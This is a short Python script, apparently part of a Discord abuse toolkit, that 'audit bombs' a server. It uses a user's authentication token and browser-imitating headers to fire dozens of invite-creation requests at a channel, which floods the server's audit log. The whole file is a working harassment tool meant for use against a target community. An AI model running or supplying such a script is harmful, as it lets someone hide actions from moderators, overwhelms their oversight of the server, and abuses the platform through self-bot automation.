
import requests

desc = "Floods the Audit Log of a Discord server. Requires invite perms."
params = {
    "token" : "your Discord authentication token",
    "channel_id" : "a channel's ID in the Discord server you want to audit bomb",
}

def run(token, channel_id):
    headers = { "accept" : "*/*", "accept-encoding" : "gzip, deflate", "accept-language" : "en-US", "authorization" : token, "dnt" : "1", "referer" : "https://discord.com/channels/@me", "sec-ch-ua-mobile" : "?0", "sec-ch-ua-platform" : "\"Windows\"", "sec-fetch-dest" : "empty", "sec-fetch-mode" : "cors", "sec-fetch-site" : "same-origin", "user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "x-debug-options" : "bugReporterEnabled", "x-discord-locale" : "en-US" }
    for age in [0, 604800, 86400, 43200, 21600, 3600, 1800]:
        for use in [0, 100, 50, 25, 10, 5, 1]:
            requests.post("https://discord.com/api/v9/channels/"+channel_id+"/invites", headers=headers, json={"validate":None,"max_age":age,"max_uses":use,"target_user_id":None,"target_type":None,"temporary":False})
if __name__ == "__main__":
    config = {}
    for param in params:
        config[param] = input("Enter "+params[param]+": ")
    run(**config)
